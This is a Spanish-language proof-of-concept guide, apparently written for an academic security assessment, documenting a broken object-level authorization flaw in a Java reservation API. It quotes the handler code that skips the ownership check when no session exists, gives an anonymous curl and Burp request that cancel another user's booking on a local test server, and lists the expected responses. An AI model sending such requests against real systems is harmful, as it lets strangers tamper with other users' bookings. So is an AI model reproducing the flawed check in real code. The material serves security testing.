# Guía de Prueba de Concepto: PoC-08 — Broken Object Level Authorization (BOLA) en Cancelación de Reservas

**Vulnerabilidad:** H-03b — Omisión de Verificación de Propiedad al Cancelar Reservas en `/api/cancelar_reserva`  
**CWE:** CWE-285 (Improper Authorization) / CWE-639  
**OWASP Top 10:2021:** A01:2021 - Broken Access Control  
**Severidad:** Crítica  
**Clasificación:** CONFIRMADO EN CÓDIGO  

---

## 1. Descripción Técnica del Fallo
En `CancelarReservaHandler.java:66-84`, la lógica para validar si una reserva pertenece al usuario que solicita su anulación está contenida dentro de una condición `if (sessionUserId != null)`:

```java
Integer sessionUserId = null;
Object sessUserObj = exchange.getAttribute("ID_USUARIO");
if (sessUserObj instanceof Integer) {
    sessionUserId = (Integer) sessUserObj;
} else if (SecurityUtils.getAuthenticatedIdUsuario().isPresent()) {
    sessionUserId = SecurityUtils.getAuthenticatedIdUsuario().get();
}

if (sessionUserId != null) {
    // Verificar si pertenece al usuario o si es rol agencia/admin
    if (!esAdmin && !esAgencia && !JavaApiServer.reservaRepositorio.perteneceAUsuario(idReserva, sessionUserId)) {
        return; // 403 Forbidden
    }
}

// Si sessionUserId es null, SE EJECUTA DIRECTAMENTE LA CANCELACIÓN:
ReservaPersistencia.CancelarResultado resultado = JavaApiServer.reservaRepositorio.cancelarReservaConDetalle(idReserva, motivo);
```

Dado que en `SecurityConfig.java:153` la ruta `/api/cancelar_reserva` está en `permitAll()`, un atacante no autenticado que no envíe cookie de sesión (`sessionUserId == null`) evade la validación de propiedad y puede cancelar la reserva de cualquier usuario de la plataforma.

---

## 2. Precondiciones
1. App local levantada en `http://127.0.0.1:8080`.
2. Reserva `#500` activa en la base de datos (perteneciente a `turista_a@test.local`).

---

## 3. Procedimiento de Ejecución Manual (Request Exacta)

### Petición `curl` Anónima (Sin sesión) para cancelar la reserva ajena `#500`:
```bash
curl -i -s -X POST "http://127.0.0.1:8080/api/cancelar_reserva" \
     -H "Content-Type: application/json" \
     -d '{
       "idReserva": 500,
       "motivo": "Cancelación no autorizada efectuada por atacante anónimo"
     }'
```

### Formato para Burp Suite Repeater:
```http
POST /api/cancelar_reserva HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0
Content-Type: application/json
Accept: application/json
Content-Length: 105
Connection: close

{
  "idReserva": 500,
  "motivo": "Cancelación no autorizada efectuada por atacante anónimo"
}
```

---

## 4. Respuesta Esperada
- **Código de Estado HTTP:** `200 OK`
- **Cuerpo de Respuesta (JSON):**
  ```json
  {
    "status": "success",
    "message": "Reserva cancelada exitosamente"
  }
  ```
- **Comprobación en Base de Datos:**
  Al consultar en MySQL:
  ```sql
  SELECT idReserva, codigoReserva, estado, motivoCancelacion FROM Reserva WHERE idReserva = 500;
  ```
  El registro refleja `estado = 'CANCELADO'` y el motivo inyectado por el atacante anónimo.

---

## 5. Qué Capturar para el Informe Académico
1. **Terminal / Burp Suite:** Captura de la petición `POST /api/cancelar_reserva` sin cookies devolviendo `HTTP 200 OK` con `"status":"success"`.
2. **Evidencia en DBeaver:** Captura de la tabla `Reserva` mostrando la fila `idReserva = 500` con `estado = CANCELADO`.
3. **Editor de Código:** Captura de `CancelarReservaHandler.java` (L66-85) señalando que el chequeo de propiedad solo se ejecuta si `sessionUserId != null`.

---

## 6. Resultado Real (Completar tras la prueba)
*(Espacio reservado para el evaluador)*

```text

```
